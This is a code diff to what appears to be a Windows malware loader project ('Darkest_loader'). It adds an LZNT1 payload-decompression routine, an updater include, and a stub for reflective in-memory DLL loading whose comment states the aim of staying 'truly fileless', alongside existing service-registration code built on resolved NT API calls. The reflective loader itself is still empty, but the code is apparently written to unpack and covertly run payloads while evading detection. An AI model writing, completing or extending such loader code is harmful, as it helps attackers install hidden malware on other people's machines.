@@ -3,6 +3,7 @@
 //
 #include "library.h"
 #include "Darkest_loader.h"
+#include "updater.h"
 
 API_TABLE api;
 
@@ -45,6 +46,27 @@ int RegisterService(API_TABLE *api) {
 
     api->NtClose(keyHandle);
     api->NtClose(paramHandle);
+    return 0;
+}
+
+
+unsigned char *decompress(PBYTE buffer, unsigned long size, unsigned long originalSize) {
+    unsigned char *decompressed = (unsigned char *) malloc(originalSize);
+    unsigned long finalSize = 0;
+
+    NTSTATUS decompressStatus = api.RtlDecompressBuffer(
+        COMPRESSION_FORMAT_LZNT1, decompressed, originalSize, buffer, size, &finalSize);
+    if (decompressStatus != 0) {
+        free(decompressed);
+        return nullptr;
+    }
+    return decompressed;
+}
+
+
+/// Should reflectively run the dll in memory to stay truly fileless, we could go down to a file on system theoretically
+/// @return 0 on success
+int AllocDllReflection() {
     return 0;
 }
 
